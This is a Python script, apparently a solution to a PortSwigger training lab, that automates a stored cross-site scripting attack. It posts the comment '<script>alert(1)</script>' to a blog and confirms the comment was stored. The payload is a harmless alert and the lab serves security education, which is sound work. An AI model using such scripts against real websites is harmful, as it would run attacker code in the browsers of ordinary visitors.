# Lab 02 — Stored XSS into HTML context with nothing encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
#
# Vulnerability: Blog comment section
# Aim:           Submit a comment that calls alert when the post is viewed
#
# Technique:
#   The comment body is stored in the DB and rendered raw in the post page.
#   Every visitor who loads the post triggers the script — no crafted link needed.
#
#   Stored payload: <script>alert(1)</script>
#   Fires for every viewer, including the admin simulation.
#
# Usage: python xss_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment, verify_stored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD  = "<script>alert(1)</script>"
POST_ID  = 1

if __name__ == "__main__":
    banner()
    section("LAB 02 — STORED XSS: HTML CONTEXT, NOTHING ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Posting comment with payload: {PAYLOAD}\n")
    r = post_comment(session, url, POST_ID, PAYLOAD)

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print(f"  ➜  Verifying payload is stored in post {POST_ID}...\n")
    verify_stored(session, url, POST_ID, PAYLOAD, "Stored XSS payload")

    print()
    print("  ➜  Open the post in a browser — alert should fire on page load:")
    print(f"     {url}/post?postId={POST_ID}")
